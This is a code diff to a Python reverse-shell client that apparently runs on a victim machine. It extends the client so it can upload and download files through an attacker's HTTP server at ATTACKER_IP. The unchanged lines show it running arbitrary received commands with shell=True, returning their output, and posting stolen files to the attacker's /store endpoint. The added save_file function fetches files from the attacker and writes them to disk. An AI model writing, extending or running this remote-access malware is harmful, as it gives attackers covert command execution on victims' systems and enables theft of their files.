@@ -1,5 +1,4 @@
-#Client ---> runs on target
-
+# TODO: unrestrict the upload and download path
 from urllib import request, parse
 import subprocess
 import time
@@ -30,8 +29,15 @@ def send_file(command):
     store_url = f'http://{ATTACKER_IP}:{ATTACKER_PORT}/store' # Posts to /store
     with open(path, 'rb') as fp:
         send_post(fp.read(), url=store_url)
-
-
+def save_file(command):
+ if 'push' in command:
+  push, path = command.strip().split(' ')
+  get_url = f'http://{ATTACKER_IP}:{ATTACKER_PORT}/?get={path}'   
+  with request.urlopen(get_url) as f:
+   res_file = f.read()
+  with open('D:/tmp/tempfile','wb') as f:
+   f.write(res_file)
+      
 def run_command(command):
     CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     send_post(CMD.stdout.read())
@@ -44,9 +50,13 @@ while True:
     if 'terminate' in command:
         break
 
-    # Send file
-    if 'grab' in command:
+    # pull file
+    if 'pull' in command:
         send_file(command)
+        continue
+    # push file
+    if 'push' in command:
+        save_file(command)
         continue
 
     run_command(command)
